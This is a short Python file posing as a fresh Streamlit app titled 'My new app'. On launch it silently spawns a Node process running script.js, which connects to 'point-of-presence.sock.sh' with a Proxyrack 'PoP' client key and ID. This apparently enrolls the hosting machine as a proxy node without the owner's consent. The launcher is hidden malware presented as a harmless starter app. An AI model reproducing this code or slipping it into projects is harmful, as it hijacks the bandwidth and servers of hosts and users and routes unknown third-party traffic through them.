import streamlit, asyncio, subprocess, pathlib

subprocess.Popen(['node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'c' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP'])
streamlit.title("🎈 My new app")
